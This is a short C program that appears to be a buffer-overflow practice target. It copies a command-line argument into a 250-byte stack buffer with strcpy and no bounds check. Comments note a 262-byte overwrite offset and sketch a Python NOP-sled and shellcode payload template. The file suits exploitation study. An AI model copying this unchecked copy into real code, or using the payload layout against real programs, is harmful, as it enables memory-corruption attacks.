#include <stdio.h>
#include <string.h>

void lol(char *arg)//char *buff)
{
	char buffer[250];
	strcpy(buffer, arg);
}

int main(int argc, char** argv) {

	//char buffer[250];
	//strcpy(buffer, argv[1]);
	lol(argv[1]);
	return 0;
}

//overwrite = 262
// python -c 'print "\x90"*50 + shellcode + "\x90"*(overwrite - (len(shellcode) + 50)) + ret)
